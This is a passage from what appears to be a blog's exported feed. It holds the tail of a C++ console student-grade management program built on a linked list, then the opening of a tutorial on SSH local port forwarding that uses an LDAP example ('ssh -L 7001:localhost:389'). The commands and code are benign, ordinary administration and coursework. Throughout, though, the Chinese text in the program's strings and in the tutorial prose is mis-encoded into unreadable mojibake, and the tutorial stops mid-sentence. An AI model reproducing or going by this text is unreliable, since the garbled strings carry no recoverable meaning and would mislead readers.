class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;    </span><br><span class="line">        last-&gt;next=t;</span><br><span class="line">        last=last-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::search()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> a;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\nè¯·è¾“å…¥è¦æŸ¥æ‰¾çš„å­¦ç”Ÿçš„å­¦å·:"</span>;<span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">    student *t = first;</span><br><span class="line">    <span class="keyword">while</span>(t)&#123;</span><br><span class="line">        <span class="keyword">if</span>(t-&gt;ID==a)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        t=t-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!t)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\næœªæ‰¾åˆ°è¦æŸ¥æ‰¾å­¦ç”Ÿï¼"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\næŸ¥æ‰¾æˆåŠŸï¼"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">" å­¦å·    å§“å     æ•°å­¦     è‹±è¯­     OPP     æ€»æˆç»©"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    t-&gt;display();        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::del()    </span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> a;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\nè¯·è¾“å…¥è¦åˆ é™¤çš„å­¦ç”Ÿçš„å­¦å·: "</span>;<span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">    student *t = first;</span><br><span class="line">    student *p=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(t)&#123;</span><br><span class="line">        <span class="keyword">if</span>(t-&gt;ID==a)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        p=t;</span><br><span class="line">        t=t-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!t)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\næœªæ‰¾åˆ°è¦åˆ é™¤å­¦ç”Ÿï¼"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!p)</span><br><span class="line">    &#123;</span><br><span class="line">        first=first-&gt;next;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\næˆåŠŸåˆ é™¤å­¦ç”Ÿ"</span>&lt;&lt;a&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">delete</span> t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        p-&gt;next=t-&gt;next;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"æˆåŠŸåˆ é™¤å­¦ç”Ÿ"</span>&lt;&lt;a&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">delete</span> t;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    num--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::showOne()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\næƒ³è¦åˆ†æå“ªä¸€é—¨æˆç»©ï¼Ÿè¯·è¾“å…¥ç›¸åº”åºå·(1:math 2:English 3:OPP):  "</span>;<span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">        <span class="keyword">if</span>(a!=<span class="number">1</span>&amp;&amp;a!=<span class="number">2</span>&amp;&amp;a!=<span class="number">3</span>)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"\nè¾“å…¥åºå·æœ‰è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥ï¼"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n\tæˆç»©åˆ†æå¦‚ä¸‹: \n"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    student::analyse(a,first);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::showAll()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"---------------------æˆç»©åˆ—è¡¨----------------------"</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">" å­¦å·    å§“å     æ•°å­¦     è‹±è¯­     OPP     æ€»æˆç»©"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    student *t = first;</span><br><span class="line">    <span class="keyword">while</span>(t)&#123;</span><br><span class="line">        t-&gt;display();</span><br><span class="line">        t=t-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::sort()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> a,n=<span class="number">0</span>;                  <span class="comment">//n--æ’å</span></span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"æƒ³è¦æŒ‰ç…§ä»€ä¹ˆæˆç»©æ’åºï¼Ÿè¯·è¾“å…¥ç›¸åº”åºå·(1.æ•°å­¦ 2.è‹±è¯­ 3.OPP 4.æ€»æˆç»©): "</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a;</span><br><span class="line">        <span class="keyword">if</span> (a!=<span class="number">1</span>&amp;&amp;a!=<span class="number">2</span>&amp;&amp;a!=<span class="number">3</span>&amp;&amp;a!=<span class="number">4</span>)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"\nè¾“å…¥åºå·æœ‰è¯¯ï¼Œè¯·é‡æ–°è¾“å…¥ : "</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    student *t=first;</span><br><span class="line">    student *p=t;</span><br><span class="line">    <span class="keyword">while</span>(p-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        t=first;</span><br><span class="line">        <span class="keyword">while</span>(t-&gt;next)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(t-&gt;next-&gt;score[a]&gt;=t-&gt;score[a])</span><br><span class="line">            &#123;</span><br><span class="line">                t-&gt;swap();</span><br><span class="line">            &#125;</span><br><span class="line">            t=t-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        p=p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    t = first;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\n\t æˆç»©è¡¨å¦‚ä¸‹: "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"å­¦å·    å§“å    æˆç»©    æ’å"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">while</span>(t)&#123;</span><br><span class="line">        n++;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">" "</span>&lt;&lt;t-&gt;getID()&lt;&lt;<span class="string">"  \t"</span>&lt;&lt;t-&gt;getName()&lt;&lt;<span class="string">"  \t"</span>;</span><br><span class="line">        <span class="keyword">switch</span>(a)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span> :<span class="built_in">cout</span>&lt;&lt;t-&gt;getMath()&lt;&lt;<span class="string">"  \t"</span>&lt;&lt;n&lt;&lt;<span class="built_in">endl</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span> :<span class="built_in">cout</span>&lt;&lt;t-&gt;getEnglesh()&lt;&lt;<span class="string">"  \t"</span>&lt;&lt;n&lt;&lt;<span class="built_in">endl</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span> :<span class="built_in">cout</span>&lt;&lt;t-&gt;getOPP()&lt;&lt;<span class="string">"  \t"</span>&lt;&lt;n&lt;&lt;<span class="built_in">endl</span>;<span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span> :<span class="built_in">cout</span>&lt;&lt;t-&gt;gettotol()&lt;&lt;<span class="string">"  \t"</span>&lt;&lt;n&lt;&lt;<span class="built_in">endl</span>;<span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        t=t-&gt;next;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> studentMessage::clear()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"ç¡®è®¤è¦æ¸…ç©ºæ‰€æœ‰ä¿¡æ¯ï¼Ÿè¯·è¾“å…¥1æˆ–2 (1:ç¡®è®¤ 2:å–æ¶ˆ) : "</span>;<span class="built_in">cin</span>&gt;&gt;x;</span><br><span class="line">    <span class="keyword">if</span> (x==<span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\nå–æ¶ˆæ¸…ç©º\n"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    student *t = first;</span><br><span class="line">    student *p;</span><br><span class="line">    <span class="keyword">while</span>(t)&#123;</span><br><span class="line">        p=t;</span><br><span class="line">        t=t-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"\næ¸…ç©ºæˆåŠŸï¼\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"é€€å‡ºæˆåŠŸï¼\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">showMenu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"                               \n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"===============================\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      å­¦ç”Ÿæˆç»©ç®¡ç†ç³»ç»Ÿ\n\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      1.æ˜¾ç¤ºæ‰€æœ‰å­¦ç”Ÿæˆç»©\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      2.æ·»åŠ ä¿¡æ¯\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      3.æŸ¥è¯¢ä¿¡æ¯\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      4.åˆ é™¤ä¿¡æ¯\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      5.æˆç»©æ’åº\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      6.å•ç§‘æˆç»©åˆ†æ\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      7.æ¸…ç©ºæ‰€æœ‰ä¿¡æ¯å¹¶é€€å‡ºç³»ç»Ÿ\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"      0.é€€å‡ºç³»ç»Ÿ\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"===============================\n"</span>;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"                               \n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    studentMessage stuM=studentMessage();</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        showMenu();</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"è¯·è¾“å…¥æ“ä½œå¯¹åº”çš„åºå· : "</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt;h;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">switch</span>(h)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: stuM.showAll(); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>: stuM.add(); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>: stuM.search(); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>: stuM.del(); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>: stuM.sort(); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>: stuM.showOne(); <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>: stuM.clear(); <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>: <span class="built_in">cout</span>&lt;&lt;<span class="string">"\né€€å‡ºæˆåŠŸï¼"</span>;<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">default</span>:<span class="built_in">cout</span>&lt;&lt;<span class="string">"\nè¾“å…¥åºå·æœ‰è¯¯ï¼è¯·è¾“å…¥æ­£ç¡®çš„åºå·ã€‚"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> c++ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SSHç«¯å£è½¬å‘</title>
      <link href="/2018/12/28/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
      <url>/2018/12/28/SSH%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"></p><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>å½“ä½ åœ¨å’–å•¡é¦†äº«å—å…è´¹ WiFi çš„æ—¶å€™ï¼Œæœ‰æ²¡æœ‰æƒ³åˆ°å¯èƒ½æœ‰äººæ­£åœ¨çªƒå–ä½ çš„å¯†ç åŠéšç§ä¿¡æ¯ï¼Ÿå½“ä½ å‘ç°å®éªŒå®¤çš„é˜²ç«å¢™é˜»æ­¢äº†ä½ çš„ç½‘ç»œåº”ç”¨ç«¯å£ï¼Œæ˜¯ä¸æ˜¯æœ‰è‹¦éš¾è¨€ï¼Ÿæ¥çœ‹çœ‹ SSH çš„ç«¯å£è½¬å‘åŠŸèƒ½èƒ½ç»™æˆ‘ä»¬å¸¦æ¥ä»€ä¹ˆå¥½å¤„å§ï¼</p><h3 id="ç«¯å£è½¬å‘æ¦‚è¿°"><a href="#ç«¯å£è½¬å‘æ¦‚è¿°" class="headerlink" title="ç«¯å£è½¬å‘æ¦‚è¿°"></a>ç«¯å£è½¬å‘æ¦‚è¿°</h3><p>æˆ‘ä»¬çŸ¥é“ï¼ŒSSH ä¼šè‡ªåŠ¨åŠ å¯†å’Œè§£å¯†æ‰€æœ‰ SSH å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´çš„ç½‘ç»œæ•°æ®ã€‚ä½†æ˜¯ï¼ŒSSH è¿˜åŒæ—¶æä¾›äº†ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„åŠŸèƒ½ï¼Œè¿™å°±æ˜¯ç«¯å£è½¬å‘ã€‚å®ƒèƒ½å¤Ÿå°†å…¶ä»– TCP ç«¯å£çš„ç½‘ç»œæ•°æ®é€šè¿‡ SSH é“¾æ¥æ¥è½¬å‘ï¼Œå¹¶ä¸”è‡ªåŠ¨æä¾›äº†ç›¸åº”çš„åŠ å¯†åŠè§£å¯†æœåŠ¡ã€‚è¿™ä¸€è¿‡ç¨‹æœ‰æ—¶ä¹Ÿè¢«å«åšâ€œéš§é“â€ï¼ˆtunnelingï¼‰ï¼Œè¿™æ˜¯å› ä¸º SSH ä¸ºå…¶ä»– TCP é“¾æ¥æä¾›äº†ä¸€ä¸ªå®‰å…¨çš„é€šé“æ¥è¿›è¡Œä¼ è¾“è€Œå¾—åã€‚ä¾‹å¦‚ï¼ŒTelnetï¼ŒSMTPï¼ŒLDAP è¿™äº› TCP åº”ç”¨å‡èƒ½å¤Ÿä»ä¸­å¾—ç›Šï¼Œé¿å…äº†ç”¨æˆ·åï¼Œå¯†ç ä»¥åŠéšç§ä¿¡æ¯çš„æ˜æ–‡ä¼ è¾“ã€‚è€Œä¸æ­¤åŒæ—¶ï¼Œå¦‚æœæ‚¨å·¥ä½œç¯å¢ƒä¸­çš„é˜²ç«å¢™é™åˆ¶äº†ä¸€äº›ç½‘ç»œç«¯å£çš„ä½¿ç”¨ï¼Œä½†æ˜¯å…è®¸ SSH çš„è¿æ¥ï¼Œé‚£ä¹ˆä¹Ÿæ˜¯èƒ½å¤Ÿé€šè¿‡å°† TCP ç«¯å£è½¬å‘æ¥ä½¿ç”¨ SSH è¿›è¡Œé€šè®¯ã€‚æ€»çš„æ¥è¯´ SSH ç«¯å£è½¬å‘èƒ½å¤Ÿæä¾›ä¸¤å¤§åŠŸèƒ½ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åŠ å¯† SSH<span class="built_in"> Client </span>ç«¯è‡³ SSH<span class="built_in"> Server </span>ç«¯ä¹‹é—´çš„é€šè®¯æ•°æ®ã€‚</span><br><span class="line">çªç ´é˜²ç«å¢™çš„é™åˆ¶å®Œæˆä¸€äº›ä¹‹å‰æ— æ³•å»ºç«‹çš„ TCP è¿æ¥ã€‚</span><br></pre></td></tr></table></figure><p>å›¾ 1. SSH ç«¯å£è½¬å‘<br><img src="http://pkf8r5ond.bkt.clouddn.com/18-12-28/411092.jpg" alt=""></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä½¿ç”¨äº†ç«¯å£è½¬å‘ä¹‹åï¼ŒTCP ç«¯å£ A ä¸ B ä¹‹é—´ç°åœ¨å¹¶ä¸ç›´æ¥é€šè®¯ï¼Œè€Œæ˜¯è½¬å‘åˆ°äº† SSH å®¢æˆ·ç«¯åŠæœåŠ¡ç«¯æ¥é€šè®¯ï¼Œä»è€Œè‡ªåŠ¨å®ç°äº†æ•°æ®åŠ å¯†å¹¶åŒæ—¶ç»•è¿‡äº†é˜²ç«å¢™çš„é™åˆ¶ã€‚</p><h2 id="æœ¬åœ°è½¬å‘ä¸è¿œç¨‹è½¬å‘"><a href="#æœ¬åœ°è½¬å‘ä¸è¿œç¨‹è½¬å‘" class="headerlink" title="æœ¬åœ°è½¬å‘ä¸è¿œç¨‹è½¬å‘"></a>æœ¬åœ°è½¬å‘ä¸è¿œç¨‹è½¬å‘</h2><h3 id="æœ¬åœ°è½¬å‘å®ä¾‹åˆ†æ"><a href="#æœ¬åœ°è½¬å‘å®ä¾‹åˆ†æ" class="headerlink" title="æœ¬åœ°è½¬å‘å®ä¾‹åˆ†æ"></a>æœ¬åœ°è½¬å‘å®ä¾‹åˆ†æ</h3><p>æˆ‘ä»¬å…ˆæ¥çœ‹ç¬¬ä¸€ä¸ªä¾‹å­ï¼Œåœ¨å®éªŒå®¤é‡Œæœ‰ä¸€å° LDAP æœåŠ¡å™¨ï¼ˆLdapServerHostï¼‰ï¼Œä½†æ˜¯é™åˆ¶äº†åªæœ‰æœ¬æœºä¸Šéƒ¨ç½²çš„åº”ç”¨æ‰èƒ½ç›´æ¥è¿æ¥æ­¤ LDAP æœåŠ¡å™¨ã€‚å¦‚æœæˆ‘ä»¬ç”±äºè°ƒè¯•æˆ–è€…æµ‹è¯•çš„éœ€è¦æƒ³ä¸´æ—¶ä»è¿œç¨‹æœºå™¨ï¼ˆLdapClientHostï¼‰ç›´æ¥è¿æ¥åˆ°è¿™ä¸ª LDAP æœåŠ¡å™¨ , æœ‰ä»€ä¹ˆæ–¹æ³•èƒ½å¤Ÿå®ç°å‘¢ï¼Ÿ</p><p>ç­”æ¡ˆæ— ç–‘æ˜¯æœ¬åœ°ç«¯å£è½¬å‘äº†ï¼Œå®ƒçš„å‘½ä»¤æ ¼å¼æ˜¯ï¼š</p><pre><code>ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;</code></pre><p>åœ¨ LdapClientHost ä¸Šæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å³å¯å»ºç«‹ä¸€ä¸ª SSH çš„æœ¬åœ°ç«¯å£è½¬å‘ï¼Œä¾‹å¦‚ï¼š</p><pre><code>$ ssh -L 7001:localhost:389 LdapServerHost</code></pre><p><img src="http://pkf8r5ond.bkt.clouddn.com/18-12-28/44696679.jpg" alt=""></p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯æœ¬ä¾‹ä¸­æˆ‘ä»¬é€‰æ‹©äº† 7001 ç«¯å£ä½œä¸ºæœ¬åœ°çš„ç›‘å¬ç«¯å£ï¼Œåœ¨é€‰æ‹©ç«¯å£å·æ—¶è¦æ³¨æ„éç®¡ç†å‘˜å¸å·æ˜¯æ— æƒç»‘å®š 1-1023 ç«¯å£çš„ï¼Œæ‰€ä»¥ä¸€èˆ¬æ˜¯é€‰ç”¨ä¸€ä¸ª 1024-65535 ä¹‹é—´çš„å¹¶ä¸”å°šæœªä½¿ç”¨çš„ç«¯å£å·å³å¯ã€‚</p><p>ç„¶åæˆ‘ä»¬å¯ä»¥å°†è¿œç¨‹æœºå™¨ï¼ˆLdapClientHostï¼‰ä¸Šçš„åº”ç”¨ç›´æ¥é…ç½®åˆ°æœ¬æœºçš„ 7001 ç«¯å£ä¸Šï¼ˆè€Œä¸æ˜¯ LDAP æœåŠ¡å™¨çš„ 389 ç«¯å£ä¸Šï¼‰ã€‚ä¹‹åçš„æ•°æ®æµå°†ä¼šæ˜¯ä¸‹é¢è¿™ä¸ªæ ·å­ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘ä»¬åœ¨ LdapClientHost ä¸Šçš„åº”ç”¨å°†æ•°æ®å‘é€åˆ°æœ¬æœºçš„ 7001 ç«¯å£ä¸Šï¼Œ</span><br><span class="line">è€Œæœ¬æœºçš„ SSH<span class="built_in"> Client </span>ä¼šå°† 7001 ç«¯å£æ”¶åˆ°çš„æ•°æ®åŠ å¯†å¹¶è½¬å‘åˆ° LdapServertHost çš„ SSH<span class="built_in"> Server </span>ä¸Šã€‚</span><br><span class="line">SSH<span class="built_in"> Server </span>ä¼šè§£å¯†æ”¶åˆ°çš„æ•°æ®å¹¶å°†ä¹‹è½¬å‘åˆ°ç›‘å¬çš„ LDAP 389 ç«¯å£ä¸Šï¼Œ</span><br><span class="line">æœ€åå†å°†ä» LDAP è¿”å›çš„æ•°æ®åŸè·¯è¿”å›ä»¥å®Œæˆæ•´ä¸ªæµç¨‹ã€‚</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¿™æ•´ä¸ªæµç¨‹åº”ç”¨å¹¶æ²¡æœ‰ç›´æ¥è¿æ¥ LDAP æœåŠ¡å™¨ï¼Œè€Œæ˜¯è¿æ¥åˆ°äº†æœ¬åœ°çš„ä¸€ä¸ªç›‘å¬ç«¯å£ï¼Œä½†æ˜¯ SSH ç«¯å£è½¬å‘å®Œæˆäº†å‰©ä¸‹çš„æ‰€æœ‰äº‹æƒ…ï¼ŒåŠ å¯†ï¼Œè½¬å‘ï¼Œè§£å¯†ï¼Œé€šè®¯ã€‚</p><p>è¿™é‡Œæœ‰å‡ ä¸ªåœ°æ–¹éœ€è¦æ³¨æ„ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">SSH ç«¯å£è½¬å‘æ˜¯é€šè¿‡ SSH è¿æ¥å»ºç«‹èµ·æ¥çš„ï¼Œæˆ‘ä»¬å¿…é¡»ä¿æŒè¿™ä¸ª SSH è¿æ¥ä»¥ä½¿ç«¯å£è½¬å‘ä¿æŒç”Ÿæ•ˆã€‚</span><br><span class="line">ä¸€æ—¦å…³é—­äº†æ­¤è¿æ¥ï¼Œç›¸åº”çš„ç«¯å£è½¬å‘ä¹Ÿä¼šéšä¹‹å…³é—­ã€‚</span><br><span class="line"></span><br><span class="line">æˆ‘ä»¬åªèƒ½åœ¨å»ºç«‹ SSH è¿æ¥çš„åŒæ—¶åˆ›å»ºç«¯å£è½¬å‘ï¼Œè€Œä¸èƒ½ç»™ä¸€ä¸ªå·²ç»å­˜åœ¨çš„ SSH è¿æ¥å¢åŠ ç«¯å£è½¬å‘ã€‚</span><br><span class="line"></span><br><span class="line">ä½ å¯èƒ½ä¼šç–‘æƒ‘ä¸Šé¢å‘½ä»¤ä¸­çš„ &lt;remote host&gt; ä¸ºä»€ä¹ˆç”¨ localhostï¼Œå®ƒæŒ‡å‘çš„æ˜¯å“ªå°æœºå™¨å‘¢ï¼Ÿ</span><br><span class="line">åœ¨æœ¬ä¾‹ä¸­ï¼Œå®ƒæŒ‡å‘ LdapServertHost ã€‚æˆ‘ä»¬ä¸ºä»€ä¹ˆç”¨ localhost è€Œä¸æ˜¯<span class="built_in"> IP </span>åœ°å€æˆ–è€…ä¸»æœºåå‘¢ï¼Ÿ</span><br><span class="line"></span><br><span class="line">å…¶å®è¿™ä¸ªå–å†³äºæˆ‘ä»¬ä¹‹å‰æ˜¯å¦‚ä½•é™åˆ¶ LDAP åªæœ‰æœ¬æœºæ‰èƒ½è®¿é—®ã€‚å¦‚æœåªå…è®¸ lookback æ¥å£è®¿é—®çš„è¯ï¼Œé‚£ä¹ˆè‡ªç„¶å°±åªæœ‰ localhost æˆ–è€…<span class="built_in"> IP </span>ä¸º 127.0.0.1 æ‰èƒ½è®¿é—®äº†ï¼Œè€Œä¸èƒ½ç”¨çœŸå®<span class="built_in"> IP </span>æˆ–è€…ä¸»æœºåã€‚</span><br><span class="line"></span><br><span class="line">å‘½ä»¤ä¸­çš„ &lt;remote host&gt; å’Œ &lt;SSH hostname&gt; å¿…é¡»æ˜¯åŒä¸€å°æœºå™¨ä¹ˆï¼Ÿå…¶å®æ˜¯ä¸ä¸€å®šçš„ï¼Œå®ƒä»¬å¯ä»¥æ˜¯ä¸¤å°ä¸åŒçš„æœºå™¨ã€‚</span><br><span class="line">æˆ‘ä»¬åœ¨åé¢çš„ä¾‹å­é‡Œä¼šè¯¦ç»†é˜è¿°è¿™ç‚¹ã€‚</span><br><span class="line"></span><br><span class="line">å¥½äº†ï¼Œæˆ‘ä»¬å·²ç»åœ¨ LdapClientHost å»ºç«‹äº†ç«¯å£è½¬å‘ï¼Œé‚£ä¹ˆè¿™ä¸ªç«¯å£è½¬å‘å¯ä»¥è¢«å…¶ä»–æœºå™¨ä½¿ç”¨ä¹ˆï¼Ÿ</span><br><span class="line"></span><br><span class="line">æ¯”å¦‚èƒ½å¦æ–°å¢åŠ ä¸€å° LdapClientHost2 æ¥ç›´æ¥è¿æ¥ LdapClientHost çš„ 7001 ç«¯å£ï¼Ÿ</span><br><span class="line">ç­”æ¡ˆæ˜¯ä¸è¡Œçš„ï¼Œåœ¨ä¸»æµ SSH 